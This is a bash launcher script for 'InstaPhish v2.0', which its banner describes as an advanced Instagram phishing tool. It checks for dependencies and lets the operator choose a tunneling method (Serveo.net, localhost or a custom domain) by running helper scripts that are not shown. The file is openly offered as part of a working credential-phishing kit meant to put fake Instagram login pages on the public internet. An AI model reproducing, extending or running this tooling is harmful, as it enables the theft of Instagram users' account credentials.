#!/bin/bash

# ================================================
#  InstaPhish v2.0 - Advanced Instagram Phishing
#  Author: r4tur1
#  Repository: github.com/r4tur1/InstaPhish
# ================================================

clear
echo -e "\e[1;31m"
cat << "EOF"
 _____           _        ___ _     _      _     
|_   _|         | |      | _ (_)___| |_   (_)___ 
  | |  _ __  ___| |_ __ _|  _| / __| ' \  | (_-<
  |_| | '_ \/ __|  _/ _\` |_| |_\__ \_||_|_/ _/__/
  _|_| | | \__ \ || (_| |_   _|___/___| (_) (_)  
 / _' | |_| |___/\__\__,_| |_|             (_)   
 \__,_|                                           
EOF
echo -e "\e[0m"
echo -e "\e[1;34m[ InstaPhish - Advanced Instagram Phishing Tool ]\e[0m"
echo -e "\e[1;34m[ Author: r4tur1 | github.com/r4tur1/InstaPhish ]\e[0m"
echo ""

# Check dependencies
dependencies=("php" "python3" "ssh" "curl" "jq")
for dep in "${dependencies[@]}"; do
    if ! command -v "$dep" &> /dev/null; then
        echo -e "\e[31m[!] Missing dependency: $dep. Install it first.\e[0m"
        exit 1
    fi
done

echo -e "\e[32m[+] All dependencies satisfied.\e[0m"
echo ""

# Menu
echo -e "\e[1;33m[ Select Tunneling Method ]\e[0m"
echo "  1) Serveo.net (Recommended)"
echo "  2) Localhost (Use with port forwarding)"
echo "  3) Custom Domain (Advanced)"
read -p "Choice [1-3]: " tunnel_choice

case $tunnel_choice in
    1)
        bash tunnel/serveo.sh
        ;;
    2)
        bash tunnel/localhost.sh
        ;;
    3)
        bash tunnel/custom.sh
        ;;
    *)
        echo "Invalid choice."
        exit 1
        ;;
esac